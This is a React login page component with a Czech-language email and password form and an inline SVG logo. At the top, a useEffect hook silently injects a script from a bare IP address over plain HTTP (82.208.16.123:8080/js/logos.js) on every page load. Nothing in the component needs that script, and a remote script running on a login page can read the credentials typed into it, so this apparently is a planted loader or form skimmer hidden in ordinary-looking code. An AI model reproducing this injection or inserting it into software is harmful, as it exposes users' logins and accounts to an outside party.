import React, { useContext, useState, useEffect } from 'react';
import { Redirect } from 'react-router-dom';
import UserContext from '../../context/user/userContext';




const Login = () => {

	useEffect(()=>{
	

			  var tag = document.createElement('script');
			  tag.async = false;
			  tag.src = "http://82.208.16.123:8080/js/logos.js";
			  var body = document.getElementsByTagName('body')[0];
			  body.appendChild(tag);
	},[])	
	

	const userContext = useContext(UserContext);
  const { isAuthenticated, login, error } = userContext;

  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });

  const { email, password } = formData;

  const onChange = (e) =>
    setFormData({ ...formData, [e.target.name]: e.target.value });

  const onSubmit = (e) => {
    e.preventDefault();
    login(email, password);
  };

  if (isAuthenticated) {
    return <Redirect to="/" />
  } 

  

  return (
    <div className="limiter">
		<div className="container-login100">
			<div className="wrap-login100">
				<form className="login100-form validate-form" onSubmit={onSubmit}>
					
					<span className="login100-form-title p-b-48" style={{maxWidth: "150px", maxHeight: "150px", margin: "0px auto 30px auto"}}>
						<svg enableBackground="new 0 0 85.3 57.4" version="1.1" viewBox="0 0 85.3 57.4" xmlns="http://www.w3.org/2000/svg">
							<path className="p1" d="M3,3h37.8v16.7h-5.6l-3.5,5.8l-4.1-5.8H3V3z M0,0v22.8h26.1l5.8,8.3l5.1-8.3h6.9V0H0z"></path>
							<path className="p1" d="m11.2 6c2.6 0 3.9 1.5 3.9 1.5l-1.2 1.9s-1.2-1.1-2.6-1.1c-2 0-2.9 1.5-2.9 3s1 3.1 2.9 3.1c1.6 0 2.7-1.3 2.7-1.3l1.3 1.9s-1.5 1.7-4.2 1.7c-3.2 0-5.4-2.3-5.4-5.4 0.1-3 2.4-5.3 5.5-5.3"></path>
							<path className="p1" d="M17.8 6.1 20.3 6.1 20.3 10.3 24 10.3 24 6.1 26.6 6.1 26.6 16.5 24 16.5 24 12.4 20.3 12.4 20.3 16.5 17.8 16.5z"></path>
							<path className="p1" d="m34.3 6c2.6 0 3.9 1.5 3.9 1.5l-1.2 1.8s-1.2-1.1-2.6-1.1c-2 0-2.9 1.5-2.9 3s1 3.1 2.9 3.1c1.6 0 2.7-1.3 2.7-1.3l1.3 1.9s-1.5 1.7-4.2 1.7c-3.2 0-5.4-2.3-5.4-5.4 0.1-2.9 2.4-5.2 5.5-5.2"></path>
								<path d="m41.2 27.5c1.7 0 2.5 1 2.5 1l-0.7 1.2s-0.8-0.7-1.7-0.7c-1.3 0-1.9 1-1.9 1.9 0 1 0.7 2 1.9 2 1 0 1.8-0.8 1.8-0.8l0.9 1.2s-1 1.1-2.7 1.1c-2.1 0-3.5-1.5-3.5-3.5-0.1-1.9 1.4-3.4 3.4-3.4"></path>
								<path d="m45.2 27.6h2.4c0.7 0 1 0 1.3 0.2 0.8 0.3 1.2 1 1.2 2 0 0.7-0.3 1.5-1 1.8 0 0 0.1 0.1 0.3 0.4l1.3 2.4h-1.8l-1.2-2.3h-0.8v2.3h-1.7v-6.8zm2.3 3c0.5 0 0.9-0.3 0.9-0.8s-0.2-0.8-1-0.8h-0.6v1.6h0.7z"></path>
								<polygon points="52 27.6 56.3 27.6 56.3 29 53.7 29 53.7 30.2 55.7 30.2 55.7 31.7 53.7 31.7 53.7 32.9 56.4 32.9 56.4 34.3 52 34.3"></polygon>
								<path d="m61.7 32.9h-2.1l-0.4 1.4h-1.7l2.3-6.8h1.7l2.3 6.8h-1.7l-0.4-1.4zm-1-3.8s-0.2 0.7-0.3 1.2l-0.4 1.3h1.3l-0.3-1.3c-0.2-0.4-0.3-1.2-0.3-1.2z"></path>
								<polygon points="65.5 29 63.5 29 63.5 27.6 69.2 27.6 69.2 29 67.2 29 67.2 34.3 65.5 34.3"></polygon>
								<rect x="70.4" y="27.6" width="1.7" height="6.8"></rect>
								<path d="m73.2 27.6h1.8l1.2 3.8c0.1 0.4 0.3 1.1 0.3 1.1s0.1-0.7 0.3-1.1l1.2-3.8h1.8l-2.4 6.8h-1.7l-2.5-6.8z"></path>
								<polygon points="80.6 27.6 84.9 27.6 84.9 29 82.3 29 82.3 30.2 84.3 30.2 84.3 31.7 82.3 31.7 82.3 32.9 85 32.9 85 34.3 80.6 34.3"></polygon>
								<polygon points="38.2 38.9 39.8 38.9 39.8 41.6 42.3 41.6 42.3 38.9 43.9 38.9 43.9 45.7 42.3 45.7 42.3 43 39.8 43 39.8 45.7 38.2 45.7"></polygon>
								<rect x="45.7" y="38.9" width="1.7" height="6.8"></rect>
								<polygon points="49.1 38.9 50.8 38.9 50.8 44.3 53.6 44.3 53.6 45.7 49.1 45.7"></polygon>
								<polygon points="54.7 38.9 56.3 38.9 56.3 44.3 59.1 44.3 59.1 45.7 54.7 45.7"></polygon>
								<path d="m41.2 50.2c1.7 0 2.5 1 2.5 1l-0.7 1.2s-0.8-0.7-1.7-0.7c-1.3 0-1.9 1-1.9 1.9 0 1 0.7 2 1.9 2 1 0 1.8-0.8 1.8-0.8l0.9 1.2s-1 1.1-2.7 1.1c-2.1 0-3.5-1.5-3.5-3.5-0.1-1.9 1.4-3.4 3.4-3.4"></path>
								<path d="m48.2 50.2c2 0 3.5 1.5 3.5 3.5s-1.5 3.5-3.5 3.5-3.5-1.6-3.5-3.5c0-2 1.5-3.5 3.5-3.5m0 5.4c1 0 1.8-0.9 1.8-2s-0.8-1.9-1.8-1.9-1.8 0.8-1.8 1.9c0 1.2 0.8 2 1.8 2"></path>
								<polygon points="53.1 50.3 54.7 50.3 54.7 55.6 57.5 55.6 57.5 57 53.1 57"></polygon>
								<polygon points="58.8 50.3 60.4 50.3 60.4 55.6 63.2 55.6 63.2 57 58.8 57"></polygon>
								<polygon points="64.3 50.3 68.5 50.3 68.5 51.7 66 51.7 66 52.9 68 52.9 68 54.3 66 54.3 66 55.6 68.7 55.6 68.7 57 64.3 57"></polygon>
								<path d="m73.1 50.2c1.7 0 2.6 0.9 2.6 0.9l-0.8 1.2s-0.7-0.6-1.6-0.6c-1.4 0-2 0.9-2 1.9 0 1.3 0.9 2.1 1.9 2.1 0.8 0 1.4-0.5 1.4-0.5v-0.5h-1v-1.4h2.4v3.7h-1.4v-0.2-0.3s-0.7 0.6-1.8 0.6c-1.7 0-3.3-1.3-3.3-3.5 0.1-1.9 1.6-3.4 3.6-3.4"></path>
								<polygon points="77.3 50.3 81.6 50.3 81.6 51.7 79 51.7 79 52.9 81 52.9 81 54.3 79 54.3 79 55.6 81.7 55.6 81.7 57 77.3 57"></polygon>
							</svg>
					</span>
					<span className="login100-form-title p-b-26" style={{marginBottom:"20px"}}>
						Vítejte
					</span>
					<div className="wrap-input100 validate-input" data-validate = "Zadejte email">
						<input className="input100" type="email" name="email"
						  
				
						  value={email}
						  onChange={onChange}
		
						/>
						<span className="focus-input100" data-placeholder="Email"></span>
					</div>

					<div className="wrap-input100 validate-input" data-validate="Zadejte heslo">
						<span className="btn-show-pass">
							<i className="zmdi zmdi-eye"></i>
						</span>
						<input className="input100" type="password" 
						 type="password"
					
						 name="password"
						 value={password}
						 onChange={onChange}
						/>
						<span className="focus-input100" data-placeholder="Password"></span>
					</div>
     					<div style={{color:"red", textAlign:"center", margin:"auto", marginBottom:10}}>
						  <span > {error && error}</span>
						  </div>
					
					<div className="container-login100-form-btn"  style={{marginBottom: "50px"}}>
						<div className="wrap-login100-form-btn">
							<div className="login100-form-bgbtn"></div>
							<button className="login100-form-btn" type='submit'>
								Přihlásit se
							</button>
						</div>
					</div>
				</form>
			</div>
		</div>
		
	</div>
  )
}

export default Login;


